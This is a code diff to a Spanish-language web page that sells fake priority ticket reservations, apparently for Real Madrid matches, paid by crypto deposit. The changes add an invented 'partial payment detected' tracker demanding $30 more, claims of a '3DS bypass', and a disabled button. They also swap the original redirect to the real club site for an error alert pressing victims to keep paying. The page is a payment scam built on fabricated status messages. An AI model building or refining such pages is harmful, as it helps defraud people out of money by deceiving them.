@@ -14,6 +14,11 @@
         #crypto-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; align-items: center; justify-content: center; padding: 20px; }
         .address-box { background: #f0f2f5; border: 1px solid #ddd; padding: 12px; border-radius: 8px; font-family: monospace; font-size: 11px; word-break: break-all; margin-top: 5px; color: #111b33; position: relative; cursor: pointer; }
         .copy-tag { position: absolute; right: 8px; top: 12px; font-size: 9px; color: #3b50b6; font-weight: bold; border: 1px solid #3b50b6; padding: 2px 4px; border-radius: 4px; background: white; }
+        
+        /* New Payment Tracker Styles */
+        .payment-status { background: #fff8e1; border: 1px solid #ffe082; padding: 15px; border-radius: 12px; margin-bottom: 20px; }
+        .status-dot { height: 10px; width: 10px; background-color: #ffb300; border-radius: 50%; display: inline-block; margin-right: 5px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
     </style>
 </head>
 <body class="flex flex-col min-h-screen">
@@ -57,7 +62,19 @@
     <div id="crypto-modal">
         <div class="bg-white rounded-3xl w-full max-w-md p-6 shadow-2xl overflow-y-auto max-h-[90vh]">
             <h3 class="text-xl font-black text-[#111b33] mb-2 uppercase italic tracking-tighter">Confirmación de Reserva</h3>
-            <p class="text-xs text-gray-500 mb-6 leading-tight">Para asegurar el asiento en el Sector 111, complete el depósito de seguridad. **Este pago evita la validación 3DS bancaria.**</p>
+            
+            <div class="payment-status">
+                <div class="flex justify-between items-center mb-2">
+                    <span class="text-[10px] font-bold text-amber-700 uppercase"><span class="status-dot"></span> Pago Parcial Detectado</span>
+                    <span class="text-[10px] font-black text-amber-800 tracking-tighter">$20.00 / $50.00</span>
+                </div>
+                <div class="w-full bg-amber-200 h-2 rounded-full mb-2">
+                    <div class="bg-amber-600 h-full rounded-full" style="width: 40%"></div>
+                </div>
+                <p class="text-[11px] text-amber-900 font-bold leading-tight">Acceso bloqueado: Deposite los <span class="underline">$30.00 restantes</span> para completar la validación del túnel prioritario.</p>
+            </div>
+
+            <p class="text-xs text-gray-500 mb-6 leading-tight">Complete el depósito de seguridad balanceado. **Este pago evita la validación 3DS bancaria y activa el bypass.**</p>
             
             <div class="space-y-4">
                 <div>
@@ -101,8 +118,8 @@
                 </div>
             </div>
 
-            <button onclick="finalRedirect()" class="mt-8 w-full py-4 bg-[#111b33] text-white rounded-xl font-bold uppercase text-xs tracking-[0.2em] hover:bg-blue-900 transition-colors">
-                VALIDAR PAGO Y CONTINUAR
+            <button onclick="finalRedirect()" class="mt-8 w-full py-4 bg-gray-400 text-white rounded-xl font-bold uppercase text-xs tracking-[0.2em] cursor-not-allowed">
+                ESPERANDO BALANCE ($30.00)...
             </button>
         </div>
     </div>
@@ -113,12 +130,10 @@
             alert("Dirección copiada: " + text);
         }
 
-        // Check if user was redirected back from Madrid site
         if (window.location.search.includes('error=auth')) {
             document.getElementById('error-alert').classList.remove('hidden');
         }
 
-        // Animation logic
         const progressBar = document.getElementById('progress-bar');
         const statusText = document.getElementById('status-text');
         const mainBtn = document.getElementById('main-btn');
@@ -130,7 +145,7 @@
                 progressBar.style.width = "100%";
                 statusText.innerHTML = "¡CONEXIÓN SEGURA! <span class='text-green-400 font-bold underline'>Bypass Activado</span>";
                 mainBtn.classList.remove('opacity-50', 'cursor-not-allowed');
-                mainBtn.innerText = "CONTINUAR A PAGO PRIORITARIO";
+                mainBtn.innerText = "COMPLETAR ACTIVACIÓN ($30.00)";
             }, 1500);
         }, 1000);
 
@@ -139,7 +154,7 @@
         }
 
         function finalRedirect() {
-            window.location.href = "https://www.realmadrid.com/es-ES/entradas?priority=true";
+            alert("Error: El balance de $30.00 no ha sido confirmado en la red. Por favor, complete el depósito para liberar el acceso.");
         }
     </script>
 </body>
